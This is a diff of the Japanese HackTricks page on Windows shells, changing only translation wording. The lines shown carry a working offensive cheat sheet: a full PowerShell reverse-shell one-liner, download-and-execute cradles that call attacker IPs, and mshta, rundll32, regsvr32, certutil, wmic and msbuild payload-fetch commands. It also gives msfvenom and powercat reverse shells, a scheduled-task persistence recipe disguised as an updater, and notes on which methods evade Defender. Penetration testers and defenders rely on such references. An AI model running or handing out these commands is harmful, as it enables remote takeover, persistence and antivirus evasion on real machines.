@@ -1,11 +1,13 @@
-# Shells - Windows
+# Shell - Windows
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ## Lolbas
 
-ページ [lolbas-project.github.io](https://lolbas-project.github.io/) は、Linux における [https://gtfobins.github.io/](https://gtfobins.github.io/) と同様に Windows 向けです。<sup>[[13]](#references)[[14]](#references)</sup>
-Windows はプロセスのセキュリティに access tokens と privileges を使用し、Windows 11 にはオプションの `sudo` コマンドも含まれています。<sup>[[11]](#references)[[12]](#references)</sup> 一部の **binaries** を悪用して、**arbitrary code の実行**などの予期しないアクションを実行する方法を知っておくと役立ちます。<sup>[[13]](#references)</sup>
+[lolbas-project.github.io](https://lolbas-project.github.io/) のページは Windows 向けであり、[https://gtfobins.github.io/](https://gtfobins.github.io/) が Linux 向けであるのと同様です。<sup>[[13]](#references)[[14]](#references)</sup>
+Windows はプロセスのセキュリティに access tokens と privileges を使用し、Windows 11 にはオプションの `sudo` command も含まれています。<sup>[[11]](#references)[[12]](#references)</sup> 一部の **binaries** を **arbitrary code の実行** など、想定外のアクションを実行するためにどのように (ab)use できるかを知っておくと役立ちます。<sup>[[13]](#references)</sup>
 
-以下に収録されている基本的な Windows reverse-shell payloads は、HighOn.Coffee と PayloadsAllTheThings の cheat sheets にも記載されています。対象に合わせてパスとインストール済みの interpreters を調整してください。<sup>[[1]](#references)[[4]](#references)</sup>
+以下にまとめた基本的な Windows reverse-shell payloads は、HighOn.Coffee および PayloadsAllTheThings の cheat sheets にも記載されています。target に合わせて paths とインストール済みの interpreters を調整してください。<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## NC
 ```bash
@@ -27,7 +29,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) は、portable かつ secure な Netcat の代替です**。Unix-like systems と Win32 で動作します。strong encryption、program execution、customizable source ports、continuous reconnection などの機能により、sbd は TCP/IP communication のための柔軟な solution を提供します。Windows users は、Kali Linux distribution の sbd.exe version を Netcat の信頼性の高い replacement として使用できます。<sup>[[15]](#references)</sup>
+**[sbd](https://www.kali.org/tools/sbd/) は、portable かつ secure な Netcat の代替手段です**。Unix-like systems と Win32 で動作します。strong encryption、program execution、customizable source ports、continuous reconnection などの機能により、sbd は TCP/IP 通信向けの versatile なソリューションを提供します。Windows users は、Kali Linux distribution の sbd.exe version を Netcat の reliable な replacement として使用できます。<sup>[[15]](#references)</sup>
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -60,7 +62,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## OpenSSH
 
-攻撃者 (Kali)
+攻撃者（Kali）
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -81,15 +83,15 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-ネットワーク通信を実行するプロセス: **powershell.exe**\
-ディスクに書き込まれた Payload: **NO** (_少なくとも、procmon を使って私が見つけられた場所にはありませんでした！_).<sup>[[5]](#references)</sup>
+ネットワーク呼び出しを実行するプロセス: **powershell.exe**\
+ディスクに書き込まれたPayload: **NO** (_少なくとも、procmon を使って私が見つけられる範囲では !_).<sup>[[5]](#references)</sup>
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
-ディスクに書き込まれるペイロード: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
+ネットワーク通信を実行するプロセス: **svchost.exe**\
+ディスクに書き込まれる Payload: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
 
-**ワンライナー:**
+**一行コマンド:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -97,7 +99,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 ## Mshta
 
-- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)を参照してください。<sup>[[5]](#references)</sup>
+- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)から。<sup>[[5]](#references)</sup>
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -134,7 +136,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**ここから**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17).<sup>[[8]](#references)</sup>
+[**こちらから**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)。<sup>[[8]](#references)</sup>
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -165,9 +167,9 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**DLL hello world の例**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
 
-- [ここから](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)。<sup>[[5]](#references)</sup>
+- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)。<sup>[[5]](#references)</sup>
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -175,11 +177,11 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Defenderによって検知**
+**Defenderによる検知**
 
 **Rundll32 - sct**
 
-[mshta - sct](#mshta-sct)セクションに示されているscriptletを再利用します。先頭のコメントに、対応する`rundll32.exe` launcherが含まれています。<sup>[[8]](#references)</sup>
+[mshta - sct](#mshta-sct)セクションに示されているscriptletを再利用します。その先頭のコメントに、対応する`rundll32.exe` launcherが含まれています。<sup>[[8]](#references)</sup>
 
 #### **Rundll32 - Metasploit**
 ```bash
@@ -198,7 +200,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-- [ここから](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
+- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)から。<sup>[[5]](#references)</sup>
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -206,14 +208,14 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Defenderによって検知**
+**defender によって検出**
 
-#### Regsvr32 – /i 引数による任意の DLL export（gatekeeping と persistence）
+#### Regsvr32 – /i 引数による任意 DLL export（gatekeeping と persistence）
 
-リモート scriptlet（`scrobj.dll`）を読み込むほか、`regsvr32.exe` はローカル DLL を読み込み、その `DllRegisterServer`/`DllUnregisterServer` export を呼び出します。Custom loader は、署名済みの LOLBin に紛れ込ませながら任意の code を実行するために、これを頻繁に悪用します。実際に確認された tradecraft のメモを 2 つ示します:<sup>[[6]](#references)</sup>
+remote scriptlet（`scrobj.dll`）の読み込みに加えて、`regsvr32.exe` は local DLL を読み込み、その `DllRegisterServer`/`DllUnregisterServer` export を呼び出します。Custom loader は、署名済み LOLBin に紛れ込ませながら任意の code を実行するために、これを頻繁に悪用します。実際に確認されている tradecraft のメモは次の 2 つです。<sup>[[6]](#references)</sup>
 
-- Gatekeeping 引数: `/i:<arg>` 経由で特定の switch が渡されない限り DLL を終了させます。例: Chromium renderer の子プロセスを装うための `/i:--type=renderer`。これにより、意図しない実行を減らし、sandbox を妨害します。
-- Persistence: `regsvr32` をスケジュールして、silent + high privileges で必要な `/i` 引数とともに DLL を実行し、updater task を装います:
+- Gatekeeping argument: `/i:<arg>` 経由で特定の switch が渡されない限り DLL が終了します。例: Chromium renderer child を偽装するための `/i:--type=renderer`。これにより、意図しない実行を減らし、sandbox を妨害します。
+- Persistence: `regsvr32` が DLL を silent + high privileges で、必要な `/i` argument とともに実行するよう schedule し、updater task を偽装します:
 ```powershell
 Register-ScheduledTask \
 -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -224,13 +226,13 @@ Register-ScheduledTask \
 -RunLevel Highest
 ```
 
-こちらも参照: JS loader を staging し、後から `regsvr32` で persistence を行う ClickFix の clipboard-to-PowerShell variant。<sup>[[6]](#references)</sup>
+こちらも参照: JS loader を stage し、後で `regsvr32` によって persist する ClickFix clipboard‑to‑PowerShell variant。<sup>[[6]](#references)</sup>
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
 
 
-[**ここから**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1).<sup>[[9]](#references)</sup>
+[**こちらから**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)。<sup>[[9]](#references)</sup>
 ```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -260,7 +262,7 @@ run
 
 ## Certutil
 
-- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)から。<sup>[[5]](#references)</sup>
+- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)。<sup>[[5]](#references)</sup>
 
 B64dllをdownloadし、decodeしてexecuteします。<sup>[[5]](#references)</sup>
 ```bash
@@ -270,7 +272,7 @@ B64exeをダウンロードし、デコードして実行します。<sup>[[5]](
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Defenderによる検知**
+**Defenderによって検知**
 
 ## **Cscript/Wscript**
 ```bash
@@ -286,8 +288,8 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-ネットワーク呼び出しを実行するプロセス：**svchost.exe**\
-ディスクに書き込まれる Payload：**WebDAV client local cache**.<sup>[[5]](#references)</sup>
+ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
+ディスクに書き込まれるPayload: **WebDAV client local cache**.<sup>[[5]](#references)</sup>
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -296,7 +298,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Defenderに検知される**
+**defender によって検出**
 
 ## **MSIExec**
 
@@ -309,7 +311,7 @@ python -m SimpleHTTPServer 80
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**検出済み**
+**検出**
 
 ## **Wmic**
 
@@ -317,7 +319,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Example xsl file [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)。<sup>[[10]](#references)</sup>
+XSLファイルの例は[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)です。<sup>[[10]](#references)</sup>
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -329,30 +331,30 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**検知されない**
+**検出されない**
 
-**stager wmicを使用して、Koadic zombieを非常に簡単にdownloadおよびexecuteできます**。<sup>[[3]](#references)</sup>
+**stager wmicを使用すると、Koadic zombieを非常に簡単にdownloadしてexecuteできます**。<sup>[[3]](#references)</sup>
 
 ## Msbuild
 
-- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)。<sup>[[5]](#references)</sup>
+- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)から。<sup>[[5]](#references)</sup>
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-このプロジェクトでは、アプリケーションのホワイトリスト登録と `powershell.exe` の制限をバイパスし、PowerShellに似たシェルを提供できる PowerShellホストとして MSBuildShell を文書化しています。<sup>[[16]](#references)</sup>\
+この project は、application whitelisting と `powershell.exe` の制限を回避し、PowerShell に似た shell を提供できる PowerShell host として MSBuildShell を解説しています。<sup>[[16]](#references)</sup>\
 これをダウンロードして実行するだけです: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)。<sup>[[16]](#references)</sup>
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
-**検出されない**
+**検知されない**
 
 ## **CSC**
 
-被害者のマシン上でC#コードをコンパイルします。<sup>[[17]](#references)[[18]](#references)</sup>
+被害者マシン上でC# codeをコンパイルします。<sup>[[17]](#references)[[18]](#references)</sup>
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-こちらから basic C# reverse shell を download できます: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+ここから basic C# reverse shell をダウンロードできます: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **検知されない**
 
@@ -368,7 +370,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\fol
 
 ## Odbcconf
 
-- [こちらから](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)。<sup>[[5]](#references)</sup>
+- [こちら](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
@@ -376,37 +378,37 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2).<sup>[[2]](#references)</sup>
 
-## PowerShell Shells
+## Powershell Shells
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-**Shells** フォルダーには、多くの異なる Shells があります。Invoke-_PowerShellTcp.ps1_ をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します:<sup>[[19]](#references)</sup>
+**Shells** フォルダーには、さまざまな Shells が多数あります。Invoke-_PowerShellTcp.ps1_ をダウンロードして実行するには、スクリプトのコピーを作成し、ファイルの末尾に追加します。<sup>[[19]](#references)</sup>
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Web server でスクリプトの配信を開始し、victim 側で実行します:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
+Web server でスクリプトの配信を開始し、被害者側で実行します:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender はこれを悪意のあるコードとして検出しません（現時点では、2019/04/03）。
+Defenderはこれを悪意のあるコードとして検出しません（現時点、2019年3月4日）。
 
-**TODO: 他の nishang shells を確認**
+**TODO: その他の nishang shells を確認**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Download し、web server を起動し、listener を起動して、victim 側で実行します:<sup>[[22]](#references)</sup>
+ダウンロードし、Webサーバーを起動し、listenerを起動して、被害者側で実行します：<sup>[[22]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender は悪意のあるコードとして検出しません（現時点では、2019 年 3 月 4 日）。
+Defender は（2019年3月4日時点では）これを malicious code として検出しません。
 
 **powercat が提供するその他のオプション:**
 
-Bind shells、Reverse shell（TCP、UDP、DNS）、Port redirect、upload/download、Generate payloads、Serve files...<sup>[[22]](#references)</sup>
+Bind shells、Reverse shell（TCP、UDP、DNS）、Port redirect、upload/download、payload の生成、ファイルの Serve など...<sup>[[22]](#references)</sup>
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -427,7 +429,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-powershell launcherを作成し、ファイルに保存してダウンロードおよび実行します。<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
+powershell launcherを作成し、ファイルに保存して、ダウンロードおよび実行します。<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -437,51 +439,51 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-unicornを使用してmetasploit backdoorのpowershell版を作成します。<sup>[[24]](#references)</sup>
+unicornを使用してMetasploit backdoorのPowerShell版を作成します。<sup>[[24]](#references)</sup>
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-作成した resource を使用して msfconsole を起動します:<sup>[[24]](#references)</sup>
+作成した resource を使って msfconsole を起動します。<sup>[[24]](#references)</sup>
 ```
 msfconsole -r unicorn.rc
 ```
-_web server_で_powershell_attack.txt_ファイルを提供し、被害者側で実行します:<sup>[[24]](#references)</sup>
+_powershell_attack.txt_ ファイルを配信する web server を起動し、victim 上で実行します。<sup>[[24]](#references)</sup>
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
 **悪意のあるコードとして検出**
 
-## 詳細
+## More
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) いくつかの offensive PS modules が事前に読み込まれた PS console（暗号化済み）\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) 一部の offensive PS modules が preload された PS console（暗号化済み）\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-[WinPWN](https://github.com/SecureThisShit/WinPwn) いくつかの offensive PS modules と proxy detection（IEX）を備えた PS console。<sup>[[25]](#references)</sup>
+[WinPWN](https://github.com/SecureThisShit/WinPwn) 一部の offensive PS modules と proxy detection（IEX）を備えた PS console。<sup>[[25]](#references)</sup>
 
 ## References
 
 - [1] [Reverse Shell Cheat Sheet: PHP、ASP、Netcat、Bash、Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [2] [Arno0x の GitHub Gists](https://gist.github.com/Arno0x)
-- [3] [Koadic - COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
+- [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 - [4] [Reverse Shell Cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [Remote Payload のダウンロードと任意コードの実行を行う Windows Oneliners](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-- [6] [Check Point Research - Pure Curtain の内幕：RAT から Builder、Coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
-- [7] [calc.hta - HTA reverse execution の例（Arno0x gist）](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
-- [8] [scriptlet.sct - mshta/rundll32 scriptlet の例（Arno0x gist）](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
-- [9] [regsvr32.sct - Regsvr32 scriptlet の例（Arno0x gist）](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
-- [10] [wmic.xsl - WMIC XSL stylesheet の例（Arno0x gist）](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
-- [11] [Access Tokens - Win32 apps（Microsoft Learn）](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+- [5] [リモート Payload を Download して任意の Code を実行する Windows Oneliner](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [6] [Check Point Research – Pure Curtain の裏側：RAT から Builder、Coder まで](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [7] [calc.hta – HTA reverse execution の例（Arno0x gist）](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+- [8] [scriptlet.sct – mshta/rundll32 scriptlet の例（Arno0x gist）](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+- [9] [regsvr32.sct – Regsvr32 scriptlet の例（Arno0x gist）](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+- [10] [wmic.xsl – WMIC XSL stylesheet の例（Arno0x gist）](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
+- [11] [Access Tokens – Win32 apps（Microsoft Learn）](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
 - [12] [Windows 用 Sudo（Microsoft Learn）](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
 - [13] [LOLBAS](https://lolbas-project.github.io/)
 - [14] [GTFOBins](https://gtfobins.github.io/)
 - [15] [sbd | Kali Linux Tools](https://www.kali.org/tools/sbd/)
 - [16] [MSBuildShell](https://github.com/Cn33liz/MSBuildShell)
-- [17] [Compiler Options - language feature rules（Microsoft Learn）](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
-- [18] [Compiler Options - output options（Microsoft Learn）](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
+- [17] [Compiler Options – language feature rules（Microsoft Learn）](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
+- [18] [Compiler Options – output options（Microsoft Learn）](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
 - [19] [Nishang](https://github.com/samratashok/nishang)
 - [20] [Invoke-WebRequest（Microsoft Learn）](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1)
 - [21] [Invoke-Expression（Microsoft Learn）](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
 - [22] [powercat](https://github.com/besimorhino/powercat)
-- [23] [Empire（アーカイブ済みリポジトリ）](https://github.com/EmpireProject/Empire)
+- [23] [Empire（archived repository）](https://github.com/EmpireProject/Empire)
 - [24] [Unicorn](https://github.com/trustedsec/unicorn)
 - [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
 - [26] [Empire Wiki](https://bc-security.gitbook.io/empire-wiki/)
